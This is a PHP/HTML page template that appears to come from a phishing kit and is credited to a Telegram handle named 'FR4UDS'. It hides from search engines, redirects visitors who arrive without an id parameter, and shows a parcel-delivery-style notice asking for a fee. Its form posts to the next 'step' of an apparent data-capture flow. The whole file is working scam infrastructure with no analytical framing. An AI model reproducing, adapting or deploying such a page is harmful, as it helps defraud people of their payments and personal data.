<?php 
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : https://t.me/FR4UDS
===========================================================================*/
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './22788001c.php?step=one&'.$id;
?>
<!DOCTYPE html>
<html lang="en" class="log">
	<head>
		<meta charset="UTF-8"/>
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<title><?php echo lang('Title'); ?></title>
		<meta name="robots" content="noindex, nofollow, noimageindex">
		<meta name="google" content="notranslate">
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="<?php echo $css1; ?>">
		<link rel="stylesheet" href="layout/css/style.css">
		<script src="./layout/js/style.js"></script>
		<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	</head>
	<body class="lowla">
		<div class="contenu">
		<header>
			<div class="pri">
				<span class="prv"><?php echo lang('Fo9001'); ?></span>
				<span class="per"><?php echo lang('Fo9002'); ?></span>
			</div>
			<div class="bande">
				<span class="lg"><img src="./layout/img/lg.svg"></span>
			<ul>
			<li><?php echo lang('LdngP2'); ?></li>
			<li><?php echo lang('LdngP3'); ?></li>
			<li><?php echo lang('LdngP4'); ?></li>
			</ul>
			</div>
		</header>
		<section>
		<form id="lFrm" method="post" action="<?php echo $action; ?>">
			<div class="parag">
				<span class="titr"><?php echo lang('LdngP5'); ?></span>
				<span class="deta"><?php echo lang('CntP'); ?></span>
				<span class="deta"><?php echo lang('CusId'); ?></span>
			</div>
			<div class="box">
			<div class="pak">
				<span class="imgpak"><img src="./layout/img/pak.png"></span>
				<div class="allt">
				<span class="dh"><?php echo lang('InpL1'); ?></span>
				<span class="coll"><?php echo lang('CusPs'); ?><img class="pb01" src="./layout/img/ta3.svg"></span>
				<ul>
				<li></li>
				<li></li>
				<li></li>
				<li></li>
				<li></li>
				</ul>
				<div><?php echo lang('InpL2'); ?><b><?php echo lang('Rmmbr'); ?></b>
				</div>
				</div>
				<div class="erro">
				<span><b style="color:#d40511"><?php echo lang('Lbtn'); ?></b><br><?php echo lang('Span1'); ?> <span style="color:#d40511;font-weight:bold;font-family:arial">(<?php echo $flouss; ?>)</span>. <?php echo lang('Span2'); ?>.</span>
				</div>
			</div>
			</div>
			<div><button type="submit" class="text-center" ><?php echo lang('Ntke'); ?></button></div>
		</form>
			<div class="pubb"><img class="pb01" src="./layout/img/pub.jpg"><img class="pb02" src="./layout/img/pubr.gif"></div>
		</section>
		</div>

	<footer>
			<div class="contenu">
		<ul>
		<li><?php echo lang('AsdH2'); ?></li>
		<li><?php echo lang('AsdS1'); ?></li>
		<li><?php echo lang('AsdS2'); ?></li>
		<li><?php echo lang('AsdS3'); ?></li>
		</ul>
		<ul>
		<li><?php echo lang('AsdS4'); ?></li>
		<li><?php echo lang('P1H1'); ?></li>
		<li><?php echo lang('P1Pr'); ?></li>
		<li><?php echo lang('P2H1'); ?></li>
		</ul>
		<ul>
		<li><?php echo lang('P2Pr'); ?></li>
		<li><?php echo lang('P3H1'); ?></li>
		<li><?php echo lang('P3Pr'); ?></li>
		<li><?php echo lang('PLink'); ?></li>
		<li><?php echo lang('FtrS1'); ?></li>
		</ul>
		<div>&copy; <?php echo date("Y"); ?><?php echo lang('FtrS2'); ?></div>
		</div>
	</footer>
	</body>
</html>
<?php
    endif;
    ob_end_flush();
?>